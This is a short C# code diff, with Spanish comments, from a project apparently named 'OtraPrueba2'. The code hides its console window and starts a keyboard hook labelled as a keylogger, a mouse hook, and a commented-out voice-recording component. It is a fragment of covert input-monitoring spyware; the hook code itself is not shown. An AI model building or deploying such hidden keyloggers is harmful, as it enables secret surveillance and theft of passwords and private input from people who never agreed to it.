@@ -7,14 +7,21 @@ namespace OtraPrueba2 {
     {
         public static void Main()
         {
-            var handle = GetConsoleWindow();
-            // Ocultar la ventana
+            var handle = GetConsoleWindow(); // Ocultar la ventana
+
+            //Activa keylogger
             KeyboardHook.Initialize();
+            
+            //Activa control de mouse
             MouseHook.Initialize();
+
+            //Activa registro de voz
+            //Speech.Initialize();
+
             Application.Run();
+
             KeyboardHook.Dispose();
             MouseHook.Dispose();
-
         }
 
         [DllImport("user32.dll")]
